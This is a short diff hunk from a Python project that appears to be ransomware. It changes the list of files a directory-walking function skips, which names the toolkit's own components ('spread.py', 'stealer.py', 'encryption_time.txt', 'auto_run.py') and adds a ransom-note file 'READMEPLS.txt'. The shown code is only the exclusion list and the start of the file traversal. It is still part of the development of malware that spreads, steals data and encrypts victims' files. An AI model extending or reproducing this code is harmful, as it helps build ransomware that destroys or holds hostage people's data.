@@ -18,7 +18,7 @@ from datetime import datetime, timedelta # Import the datetime and timedelta
 files = [] # List to store the files in the current directory
 def recorrer_arbol_directorios(directory):
     global files
-    importantF=["darthvader.py", "skywalker.py", "logo.png", "spread.py", "time_remaining.txt", "window.py", "stealer.py", "auto_run", "encryption_time.txt","README.md","auto_run.py"]
+    importantF=["darthvader.py", "skywalker.py", "logo.png", "spread.py", "time_remaining.txt", "window(no usage).py", "stealer.py", "auto_run", "encryption_time.txt","READMEPLS.txt" ,"README.md","auto_run.py"]
     try:
         for file in os.listdir(directory):
             rute_element = os.path.join(directory, file)
